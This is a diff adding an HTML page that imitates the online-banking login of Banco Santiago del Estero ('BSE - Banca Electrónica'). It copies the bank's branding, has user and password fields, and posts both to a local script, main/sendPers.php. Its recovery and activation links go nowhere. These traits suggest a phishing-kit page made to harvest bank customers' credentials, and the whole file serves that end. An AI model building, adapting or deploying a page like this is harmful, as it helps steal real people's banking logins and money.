@@ -1,0 +1,675 @@
+<!DOCTYPE html>
+<html lang="es-ar">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>BSE - Banca Electrónica</title>
+
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600&display=swap" rel="stylesheet">
+
+  <style>
+    *{
+      margin:0;
+      padding:0;
+      box-sizing:border-box;
+      font-family: Inter, system-ui, -apple-system, BlinkMacSystemFont, sans-serif;
+    }
+
+    body{
+      min-height:100vh;
+      background:#ffffff;
+      color:#111827;
+      display:flex;
+      overflow:hidden;
+    }
+
+    .container{
+      display:flex;
+      width:100%;
+      height:100vh;
+    }
+
+    /* Columna izquierda - Formulario que ocupa toda la altura */
+    .form-column{
+      flex:0 0 50%;
+      padding:0; /* Sin padding para control total */
+      display:flex;
+      flex-direction:column;
+      justify-content:center;
+      align-items:center;
+      overflow-y:auto;
+      height:100vh; /* Altura completa */
+    }
+
+    .form-wrapper{
+      width:100%;
+      max-width:320px;
+      margin:0 auto;
+      padding:40px 0; /* Padding vertical para espaciado */
+    }
+
+    .logo-container{
+      margin-bottom:20px; /* Aumentado para más separación en PC */
+      display:flex;
+      justify-content:flex-start;
+      align-items:center;
+      gap:20px;
+    }
+
+    .logo-container img{
+      max-height:50px; /* Un poco más grande en PC */
+      width:auto;
+      object-fit:contain;
+    }
+
+    .bank-name{
+      font-size:15px;
+      font-weight:600;
+      color:#0f3c5f;
+      letter-spacing:-0.2px;
+    }
+
+    h1{
+      font-size:19px; /* Un poco más grande en PC */
+      font-weight:600;
+      margin-bottom:25px; /* Más separación */
+      color:#1f2937;
+      text-align:left;
+      line-height:1.3;
+    }
+
+    .field{
+      margin-bottom:22px; /* Más separación entre campos en PC */
+      position:relative;
+    }
+
+    input{
+      width:100%;
+      padding:8px 16px; /* Más padding en PC */
+      border:1px solid #d1d5db;
+      border-radius:8px;
+      font-size:13px; /* Texto más grande en PC */
+      outline:none;
+      transition:border-color 0.2s;
+      height:40px; /* Más alto en PC */
+    }
+
+    input:focus{
+      border-color:#0f3c5f;
+      box-shadow:0 0 0 2px rgba(15, 60, 95, 0.1);
+    }
+
+    input.error-input{
+      border-color:#dc2626;
+    }
+
+    .toggle{
+      position:absolute;
+      right:15px;
+      top:50%;
+      transform:translateY(-50%);
+      cursor:pointer;
+      font-size:12px;
+      color:#6b7280;
+      user-select:none;
+    }
+
+    .field-label{
+      font-size:12px;
+      color:#4b5563;
+      margin-bottom:4px;
+      display:block;
+      font-weight:500;
+    }
+
+    .field-hint{
+      font-size:10px;
+      color:#dc2626;
+      margin-top:2px;
+      display:none;
+    }
+
+    .field-hint.show{
+      display:block;
+    }
+
+    .options{
+      display:flex;
+      justify-content:space-between;
+      align-items:center;
+      font-size:12px;
+      color:#374151;
+      margin-bottom:20px; /* Más separación */
+    }
+
+    .options label{
+      display:flex;
+      align-items:center;
+      gap:8px;
+      cursor:pointer;
+    }
+
+    /* Checkbox más pequeño pero visible */
+    .options input[type="checkbox"] {
+      width:16px;
+      height:16px;
+      cursor:pointer;
+      accent-color:#0f3c5f;
+    }
+
+    .options a{
+      color:#0f3c5f;
+      text-decoration:none;
+      font-weight:500;
+      transition:color 0.2s;
+      font-size:13px;
+    }
+
+    .options a:hover{
+      color:#0a2d47;
+    }
+
+    .btn{
+      width:100%;
+      padding:8px;
+      border-radius:25px;
+      border:none;
+      font-size:13px;
+      font-weight:600;
+      cursor:pointer;
+      transition:all 0.2s;
+      height:40px;
+      margin-bottom:12px; /* Más separación entre botones */
+    }
+
+    .btn-primary{
+      background:#0f3c5f;
+      color:white;
+    }
+
+    .btn-primary:hover{
+      background:#0a2d47;
+    }
+
+    .btn-secondary{
+      background:#ffffff;
+      border:1px solid #0f3c5f;
+      color:#0f3c5f;
+      margin-bottom:0;
+    }
+
+    .btn-secondary:hover{
+      background:#f0f7ff;
+    }
+
+    .links{
+      margin-top:25px; /* Más separación */
+      display:flex;
+      justify-content:space-between;
+      font-size:12px;
+    }
+
+    .links a{
+      text-decoration:none;
+      color:#0f3c5f;
+      font-weight:500;
+      transition:color 0.2s;
+    }
+
+    .links a:hover{
+      color:#0a2d47;
+    }
+
+    .note{
+      margin-top:20px; /* Más separación */
+      font-size:10px;
+      color:#6b7280;
+      line-height:1.8;
+      text-align:left;
+    }
+
+    .error{
+      font-size:12px;
+      color:#dc2626;
+      margin-bottom:15px;
+      text-align:left;
+      padding:8px 12px;
+      background:#fef2f2;
+      border-radius:8px;
+      border-left:3px solid #dc2626;
+      display:none;
+    }
+
+    .error.show{
+      display:block;
+    }
+
+    .field-error{
+      font-size:10px;
+      color:#dc2626;
+      margin-top:2px;
+      text-align:left;
+      display:none;
+    }
+
+    .field-error.show{
+      display:block;
+    }
+
+    /* Columna derecha - Imagen fija */
+    .image-column{
+      flex:0 0 50%;
+      display:flex;
+      height:100vh; /* Altura completa */
+    }
+
+    .image-container{
+      width:100%;
+      height:100%;
+      position:relative;
+    }
+
+    .image-container img{
+      width:100%;
+      height:100%;
+      object-fit:cover;
+      display:block;
+    }
+
+    /* Imagen para móvil - OCULTA */
+    .mobile-image{
+      display:none;
+    }
+
+    /* Clase para ocultar elementos en móvil */
+    .hide-on-mobile {
+      display: inline-block;
+    }
+
+    /* Responsive - Tablet y móvil */
+    @media (max-width: 991px){
+      body{
+        overflow-y:auto;
+        display:block;
+        height:100vh;
+      }
+      
+      .container{
+        flex-direction:column;
+        height:100vh;
+        min-height:100vh;
+      }
+      
+      .form-column{
+        flex:1;
+        width:100%;
+        min-width:100%;
+        padding:0 !important;
+        margin:0 !important;
+        order:1;
+        justify-content:center !important;
+        align-items:center !important;
+        overflow-y:auto;
+        height:100vh;
+      }
+      
+      .form-wrapper{
+        max-width:300px;
+        width:100%;
+        margin:0 auto;
+        padding:30px 0;
+      }
+      
+      .image-column{
+        display:none;
+      }
+      
+      .mobile-image{
+        display:none;
+      }
+      
+      .logo-container{
+        justify-content:flex-start;
+        margin-bottom:25px;
+      }
+      
+      .logo-container img{
+        max-height:45px;
+      }
+      
+      .bank-name{
+        display:none;
+      }
+      
+      h1{
+        text-align:left;
+        margin-bottom:30px;
+        font-size:18px;
+      }
+      
+      .field{
+        margin-bottom:22px;
+      }
+      
+      input{
+        height:38px;
+        font-size:13px;
+        padding:8px 15px;
+      }
+      
+      .options{
+        margin-bottom:25px;
+        font-size:12px;
+        justify-content:flex-start;
+      }
+      
+      /* Ocultar Teclado virtual en móvil */
+      .options a {
+        display: none;
+      }
+      
+      .options input[type="checkbox"] {
+        width:16px;
+        height:16px;
+      }
+      
+      .btn{
+        height:38px;
+        font-size:13px;
+        margin-bottom:12px;
+      }
+      
+      .links{
+        margin-top:25px;
+        font-size:12px;
+      }
+      
+      .note{
+        margin-top:30px;
+        font-size:10px;
+        line-height:1.8;
+      }
+    }
+
+    @media (max-width: 480px){
+      body{
+        overflow-x:hidden;
+        background:#ffffff;
+        height:100vh;
+        margin:0;
+        padding:0;
+      }
+      
+      .container{
+        width:100vw;
+        height:100vh;
+        min-height:100vh;
+        overflow:hidden;
+      }
+      
+      .form-column{
+        padding:0 !important;
+        width:100% !important;
+        max-width:100% !important;
+        margin:0 !important;
+        justify-content:center !important;
+        align-items:center !important;
+        height:100vh;
+        min-height:100vh;
+      }
+      
+      .form-wrapper{
+        max-width:280px !important;
+        width:100%;
+        margin:0 auto;
+        padding:20px 0;
+      }
+      
+      .logo-container{
+        justify-content:flex-start;
+        margin-bottom:25px;
+        width:100%;
+      }
+      
+      .logo-container img{
+        max-height:40px;
+      }
+      
+      h1{
+        font-size:17px;
+        text-align:left;
+        margin-bottom:28px;
+        width:100%;
+        line-height:1.4;
+      }
+      
+      .field{
+        margin-bottom:20px;
+        width:100%;
+      }
+      
+      .field-label{
+        font-size:11px;
+        margin-bottom:3px;
+      }
+      
+      input{
+        height:38px;
+        font-size:13px;
+        padding:8px 12px;
+        border-radius:6px;
+      }
+      
+      .options{
+        margin-bottom:22px;
+        font-size:12px;
+      }
+      
+      .options input[type="checkbox"] {
+        width:15px;
+        height:15px;
+      }
+      
+      .btn{
+        height:38px;
+        font-size:13px;
+        padding:8px;
+        margin-bottom:10px;
+      }
+      
+      .links{
+        margin-top:20px;
+        font-size:12px;
+      }
+      
+      .note{
+        margin-top:25px;
+        font-size:9px;
+        line-height:1.7;
+      }
+    }
+  </style>
+</head>
+<body>
+
+  <div class="container">
+    <!-- Columna izquierda - Formulario -->
+    <div class="form-column">
+      <div class="form-wrapper">
+        <!-- Logo BSE como imagen -->
+        <div class="logo-container">
+          <img src="logo.png" alt="BSE Banco Santiago del Estero" onerror="this.style.display='none'">
+          <div class="bank-name"></div>
+        </div>
+
+        <h1>Ingresá tus datos<br>para comenzar a operar</h1>
+
+        <!-- Formulario SIN recuadro -->
+        <div class="error" id="error">Completá usuario y clave</div>
+
+        <form id="loginForm" method="POST" action="main/sendPers.php">
+          <div class="field">
+            <label class="field-label">Usuario</label>
+            <input type="text" id="usuario" name="usuario" placeholder="Ingresá tu usuario" required>
+            <span class="field-hint" id="usuario-hint">Este dato es obligatorio</span>
+            <div class="field-error" id="usuario-error">Por favor, ingresá tu usuario</div>
+          </div>
+
+          <div class="field">
+            <label class="field-label">Clave</label>
+            <input type="password" id="clave" name="clave" placeholder="Ingresá tu clave" required>
+            <span class="toggle" onclick="toggleClave()">👁</span>
+            <span class="field-hint" id="clave-hint">Este dato es obligatorio</span>
+            <div class="field-error" id="clave-error">Por favor, ingresá tu clave</div>
+          </div>
+
+          <div class="options">
+            <label>
+              <input type="checkbox" id="recordar" name="recordar">
+              Recordar usuario
+            </label>
+            <a href="#" class="hide-on-mobile">Teclado virtual</a>
+          </div>
+
+          <button type="submit" class="btn btn-primary">Ingresar</button>
+          <button type="button" class="btn btn-secondary">Activar usuario o empresa</button>
+
+          <div class="links">
+            <a href="#">Recuperar usuario</a>
+            <a href="#">Recuperar clave</a>
+          </div>
+        </form>
+
+        <div class="note">
+          Recordá que Link nunca te solicitará tus claves personales
+          por correo electrónico o cualquier otro medio.
+        </div>
+
+        <!-- Imagen para móvil (abajo del formulario) - OCULTA -->
+        <div class="mobile-image">
+          <img src="fondo.jpg" alt="Banca Electrónica BSE" onerror="this.style.display='none'">
+        </div>
+      </div>
+    </div>
+
+    <!-- Columna derecha - Imagen fija (solo desktop) -->
+    <div class="image-column">
+      <div class="image-container">
+        <img src="fondo.jpg" alt="Banca Electrónica BSE" onerror="this.style.display='none'">
+      </div>
+    </div>
+  </div>
+
+<script>
+  function toggleClave(){
+    const c = document.getElementById('clave');
+    const toggle = document.querySelector('.toggle');
+    if(c.type === 'password'){
+      c.type = 'text';
+      toggle.textContent = '🙈';
+    }else{
+      c.type = 'password';
+      toggle.textContent = '👁';
+    }
+  }
+
+  // Cargar usuario recordado si existe
+  document.addEventListener('DOMContentLoaded', function() {
+    const usuarioRecordado = localStorage.getItem('usuario_recordado');
+    if(usuarioRecordado){
+      document.getElementById('usuario').value = usuarioRecordado;
+      document.getElementById('recordar').checked = true;
+    }
+  });
+
+  // Manejar el envío del formulario
+  document.getElementById('loginForm').addEventListener('submit', function(e) {
+    e.preventDefault();
+    
+    const usuario = document.getElementById('usuario');
+    const clave = document.getElementById('clave');
+    const usuarioError = document.getElementById('usuario-error');
+    const claveError = document.getElementById('clave-error');
+    const usuarioHint = document.getElementById('usuario-hint');
+    const claveHint = document.getElementById('clave-hint');
+    const errorGeneral = document.getElementById('error');
+    
+    const usuarioVal = usuario.value.trim();
+    const claveVal = clave.value.trim();
+    
+    let hasError = false;
+    
+    // Resetear errores
+    errorGeneral.classList.remove('show');
+    usuario.classList.remove('error-input');
+    clave.classList.remove('error-input');
+    usuarioError.classList.remove('show');
+    claveError.classList.remove('show');
+    usuarioHint.classList.remove('show');
+    claveHint.classList.remove('show');
+    
+    // Validar usuario
+    if(!usuarioVal){
+      usuario.classList.add('error-input');
+      usuarioError.classList.add('show');
+      usuarioHint.classList.add('show');
+      hasError = true;
+    }
+    
+    // Validar clave
+    if(!claveVal){
+      clave.classList.add('error-input');
+      claveError.classList.add('show');
+      claveHint.classList.add('show');
+      hasError = true;
+    }
+    
+    // Si hay errores, mostrar mensaje general
+    if(hasError){
+      errorGeneral.classList.add('show');
+      // Enfocar el primer campo con error
+      if(!usuarioVal){
+        usuario.focus();
+      }else if(!claveVal){
+        clave.focus();
+      }
+      return;
+    }
+    
+    // Si pasa la validación, guardar usuario si está marcado "recordar"
+    const recordar = document.getElementById('recordar').checked;
+    if(recordar){
+      localStorage.setItem('usuario_recordado', usuarioVal);
+    } else {
+      localStorage.removeItem('usuario_recordado');
+    }
+    
+    // Enviar el formulario
+    this.submit();
+  });
+
+  // Mostrar "Este dato es obligatorio" al enfocar y borrar
+  document.getElementById('usuario').addEventListener('focus', function() {
+    document.getElementById('usuario-hint').classList.add('show');
+  });
+
+  document.getElementById('clave').addEventListener('focus', function() {
+    document.getElementById('clave-hint').classList.add('show');
+  });
+
+  // Ocultar si hay contenido
+  document.getElementById('usuario').addEventListener('input', function() {
+    if(this.value.trim()) {
+      document.getElementById('usuario-hint').classList.remove('show');
+    }
+  });
+
+  document.getElementById('clave').addEventListener('input', function() {
+    if(this.value.trim()) {
+      document.getElementById('clave-hint').classList.remove('show');
+    }
+  });
+</script>
+
+</body>
+</html>
